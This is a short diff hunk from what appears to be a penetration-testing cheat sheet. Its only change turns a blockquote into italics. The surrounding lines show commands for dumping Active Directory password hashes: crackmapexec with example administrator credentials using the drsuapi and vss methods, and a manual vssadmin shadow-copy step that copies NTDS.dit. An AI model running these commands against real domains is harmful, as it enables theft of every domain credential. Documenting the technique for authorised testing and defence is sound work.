@@ -459,7 +459,7 @@ crackmapexec smb 10.10.13.100 -u 'Administrator' -p $password --ntds drsuapi
 ```powershell
 crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --ntds vss
 ```
-> you can do it manually too.
+*you can do it manually too.*
 ```powershell
 vssadmin create shadow /for=C:
 copy $ShadowCopyName\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit.save
